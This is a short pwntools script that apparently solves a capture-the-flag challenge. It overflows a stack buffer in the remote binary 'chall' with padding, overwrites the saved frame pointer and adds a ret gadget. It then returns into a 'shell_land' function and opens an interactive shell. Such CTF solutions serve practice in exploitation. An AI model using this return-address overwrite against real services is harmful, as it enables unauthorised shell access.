#!/usr/bin/env python3
from pwn import *

context.binary = "./chall"

local = False
if local:
    io = process("./chall")
else:
    io = remote("tjc.tf", 31680)

elf = ELF("./chall")
rop = ROP(elf)
addr_sh = elf.sym["shell_land"]

rop.raw(b'A' * 0x10) # Fill buffer
rop.raw(b'B' * 0x8) # Overwrite rbp
rop.raw(rop.ret) # Stack adjustment
rop.raw(addr_sh)

print(rop.dump())

io.recvuntil(b"Where am I going today?\n")
io.send(rop.chain())

io.interactive()
